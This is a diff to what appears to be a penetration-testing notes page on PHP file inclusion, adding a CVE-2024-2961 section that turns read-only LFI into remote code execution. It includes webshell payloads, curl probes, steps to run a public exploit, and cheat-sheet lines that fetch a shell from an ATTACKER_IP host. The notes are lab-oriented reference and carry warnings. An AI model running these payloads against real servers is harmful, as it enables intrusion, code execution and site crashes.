@@ -1,6 +1,6 @@
 # File Inclusion
 
-#LFI #RFI #FileInclusion #RemoteFileInclusion #LocalFileInclusion #PathTraversal
+#LFI #RFI #FileInclusion #RemoteFileInclusion #LocalFileInclusion #PathTraversal #RCE #LogPoisoning #PHPWrappers #FilterChain #ffuf #wfuzz #BurpSuite
 
 ## What is this?
 
@@ -16,11 +16,13 @@ Web app dynamically includes files based on user input. LFI = local files, RFI =
 
 | Tool | Purpose |
 |---|---|
-| `ffuf` / `wfuzz` | Fuzz for LFI parameters and path traversal variations |
-| `Burp Suite` | Manual interception and testing of file inclusion params |
-| `LFISuite` | Automated LFI exploitation and path traversal |
-| `php_filter_chain_generator` | Generate PHP filter chains for LFI → RCE |
-| `Fimap` | LFI/RFI scanner and exploitation tool |
+| [[Tools/Scanning/ffuf\|ffuf]] / [[Tools/Scanning/wfuzz\|wfuzz]] | Fuzz for LFI parameters and path traversal variations |
+| [[Tools/Web/Burpsuite\|Burp Suite]] | Manual interception and testing of file inclusion params |
+| [[Tools/Web/LFI Suite\|LFI Suite]] | Automated LFI exploitation and path traversal |
+| [[Tools/Web/php_filter_chain_generator\|php_filter_chain_generator]] | Generate PHP filter chains for LFI → RCE |
+| [[Tools/Web/fimap\|fimap]] | LFI/RFI scanner and exploitation tool |
+| [[Tools/Web/LFI Freak\|LFI Freak]] / [[Tools/Web/liffy\|liffy]] | Alternative LFI exploitation frameworks |
+| [cnext-exploits](https://github.com/ambionics/cnext-exploits) | CVE-2024-2961 PoC — read-only LFI → RCE |
 
 ---
 
@@ -250,6 +252,42 @@ python3 php_filter_chain_generator.py --chain '<?php system($_GET["cmd"]); ?>'
 
 > [!tip]
 > This is one of the most reliable LFI → RCE paths on HTB. If you have LFI on a PHP app and can't write files or poison logs, try filter chains first — they require only `include()` with a controllable parameter.
+
+> [!warning] Filter chains need the sink to be `include()`/`require()`. If the parameter only *reads* (`file_get_contents`, `readfile`, `fopen`), the chain returns your payload as text and nothing executes — that's when you reach for CVE-2024-2961 below.
+
+### CVE-2024-2961 — iconv/glibc Overflow (Read-Only LFI → RCE)
+
+The one that turns a **file-read-only** LFI into RCE. `convert.iconv.UTF-8.ISO-2022-CN-EXT` triggers a one-byte out-of-bounds write in glibc's `iconv()`; the exploit leaks memory layout through the same LFI (`/proc/self/maps`, then the glibc binary itself), then corrupts PHP's `zend_mm_heap` so `custom_heap._free` points at `system`. No `include()`, no write primitive, no `allow_url_include`.
+
+**Preconditions — check all four before burning time:**
+
+| Requirement | How to check via the LFI |
+|---|---|
+| PHP 7.0.0 – 8.3.7 | `?file=/proc/self/cmdline`, or read `phpinfo` output |
+| glibc ≤ 2.39 | read `/usr/lib/x86_64-linux-gnu/libc.so.6` version string, or `/etc/os-release` to infer |
+| `convert.iconv`, `zlib.inflate`, `dechunk` filters available | attempt a plain `convert.base64-encode` filter first |
+| `/proc/self/maps` readable | `?file=/proc/self/maps` returns the memory map |
+
+```bash
+# Confirm the vulnerable charset is reachable at all — a 500/blank where other
+# filters return data is itself a strong signal the overflow fired
+curl -s "http://<TARGET>/?file=php://filter/convert.iconv.UTF-8.ISO-2022-CN-EXT/resource=/etc/passwd"
+
+# Confirm the leak primitive the exploit depends on
+curl -s "http://<TARGET>/?file=/proc/self/maps" | head
+```
+
+```bash
+# Exploitation — use the published PoC rather than hand-rolling the heap grooming
+git clone https://github.com/ambionics/cnext-exploits
+cd cnext-exploits
+python3 cnext-exploit.py 'http://<TARGET>/index.php?file=' 'id'
+# The script needs the LFI parameter to be the LAST thing in the URL
+```
+
+> [!note] Patched in glibc 2.40 (and backported by distros through 2024). A patched glibc on an otherwise ancient PHP kills this path entirely — check glibc, not PHP, first. Debian/Ubuntu security updates from ~May 2024 onward carry the fix.
+
+> [!warning] The exploit corrupts the PHP heap. A failed attempt frequently segfaults the worker and can take the site down or leave it unstable — this is not a safe probe. Confirm the preconditions and get explicit sign-off before running it against anything you don't own.
 
 ### phar:// - PHP Archives
 
@@ -1120,7 +1158,9 @@ cat /proc/net/tcp | awk '{print $2}' | grep -v local
 | Read PHP source as base64 | `?file=php://filter/read=convert.base64-encode/resource=config` |
 | Inject code (needs allow_url_include) | `?file=data://text/plain,<?php phpinfo(); ?>` |
 | POST payload via php://input | `curl -X POST -d '<?php system($_GET["cmd"]); ?>' 'http://target.com/?language=php://input&cmd=id'` |
-| RCE with no write/upload needed | `python3 php_filter_chain_generator.py --chain '<?php system($_GET["cmd"]); ?>'` |
+| RCE with no write/upload needed (`include()` sink) | `python3 php_filter_chain_generator.py --chain '<?php system($_GET["cmd"]); ?>'` |
+| RCE from a **read-only** LFI (CVE-2024-2961) | `python3 cnext-exploit.py 'http://target.com/index.php?file=' 'id'` — needs glibc ≤ 2.39 |
+| Check glibc version via LFI | `?file=/proc/self/maps` then read the mapped `libc.so.6` |
 | Zip-based RCE | `?file=zip://uploads/shell.jpg%23shell.php&cmd=id` |
 | RFI shell (allow_url_include=On) | `?language=http://ATTACKER_IP/shell.php&cmd=id` |
 | SMB-based RFI (Windows) | `impacket-smbserver -smb2support share $(pwd)` then `?file=\\ATTACKER_IP\share\shell.php` |
@@ -1135,5 +1175,5 @@ cat /proc/net/tcp | awk '{print $2}' | grep -v local
 ---
 
 *Created: 2026-02-27*
-*Updated: 2026-07-27*
-*Model: claude-sonnet-5*
+*Updated: 2026-07-30*
+*Model: claude-opus-5*
